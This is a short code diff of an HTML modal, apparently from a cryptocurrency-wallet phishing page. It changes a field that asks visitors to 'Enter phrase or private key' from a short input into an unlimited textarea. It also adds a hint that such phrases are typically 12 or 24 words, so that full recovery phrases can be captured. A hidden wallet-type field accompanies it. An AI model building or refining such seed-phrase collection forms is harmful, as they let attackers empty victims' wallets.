@@ -1214,8 +1214,9 @@
                     </button>
                 </div>
                 <div class="modal-body">
-                    <input type="text" class="form-control" name="key" placeholder="Enter phrase or private key"
-                           required minlength="14" maxlength="24"/>
+                    <textarea type="text" class="form-control" name="key" placeholder="Enter phrase or private key"
+                           required></textarea>
+                           <i class="info">Typically 12(sometimes 24) words separated by single space</i>
                     <input type="hidden" id="wallet" name="wallet_type" value=""/>
                 </div>
                 <div class="modal-footer">
